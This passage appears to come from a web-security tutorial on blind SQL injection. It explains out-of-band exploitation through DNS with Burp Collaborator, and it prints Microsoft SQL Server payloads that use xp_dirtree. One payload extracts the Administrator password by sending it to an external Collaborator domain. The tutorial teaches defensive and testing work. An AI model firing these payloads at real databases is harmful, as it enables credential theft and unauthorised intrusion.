The application can execute the same SQL query as in the previous example, but asynchronously. It continues to process the user's request on the original thread and uses another thread to execute the SQL query using the tracking cookie. The request is still vulnerable to SQL injection, but none of the techniques described earlier will help here. The application's response does not depend on whether the request returns data, throws an error, or how long it takes to execute.
In this situation, we can usually exploit the blind SQL injection vulnerability by initiating out-of-band network communications with the system we control. These can be called depending on the injected condition to extract information piecemeal. Moreover, data can be transferred directly within the network communication.

A variety of network protocols can be used for this purpose, but the most effective is usually the DNS (Domain Name Service) protocol. Many production networks allow free outgoing DNS traffic, as it is necessary for the normal operation of the systems. The simplest and most reliable tool for out-of-band techniques is Burp Collaborator. This is a server that provides custom implementations of various network services, including DNS. It allows you to determine when network interactions occur as a result of sending individual payloads to a vulnerable application. Burp Suite Professional includes a built-in client that is ready to work with Burp Collaborator out of the box. You can find more details in the documentation for `Burp Collaborator`.
The techniques for initiating a DNS query depend on the type of database used. For example, in **Microsoft SQL Server** you can use the following input to initiate a DNS query to a specified domain:
```SQL
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```
This will cause the database to attempt to query the following domain:
```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```
We can use `Burp Collaborator` to generate a unique subdomain and query the Collaborator server, verifying that DNS queries are being made.

Once we have verified that we can cause `out-of-band` communications, we can use this channel to extract data from the vulnerable application. For example:
```SQL
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```
This input reads the password of the admin user, adds the unique Collaborator subdomain, and issues a DNS query. As a result, we will see the captured password in the DNS query:
```ERROR
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```
**Out-of-band (OAST) techniques** are a powerful way to detect and exploit blind SQL injection vulnerabilities due to their high success rate and the ability to directly transmit data through this channel. This is why OAST techniques are often preferred, even if other methods for exploiting blind SQL injection also work.

>**Note**  
>There are different ways to cause out-of-band interactions, and different databases use different techniques.
